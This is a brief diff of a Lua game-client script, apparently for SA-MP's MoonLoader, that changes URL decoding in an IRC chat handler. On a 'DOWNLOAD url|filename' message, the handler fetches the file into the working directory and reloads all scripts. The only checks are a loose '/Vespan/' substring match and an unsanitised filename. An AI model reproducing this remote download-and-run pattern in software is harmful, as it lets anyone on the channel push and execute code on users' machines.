@@ -112,7 +112,7 @@ function onChat(user, channel, text)
 		if text:find('DOWNLOAD .+|.+') then
 			local url,filename = text:match('DOWNLOAD (.+)|(.+)') 
 			if url:find('.+/Vespan/.+') then
-				downloadUrlToFile(url,getWorkingDirectory()..'/'..filename,
+				downloadUrlToFile(u8:decode(url),getWorkingDirectory()..'/'..filename,
 				function(id, status, p1, p2)
 					if status == 58 then
 						sampAddChatMessage('[IRC] Успешно скачан файл '..filename..',перезагружаю все скрипты!',0xffef61)
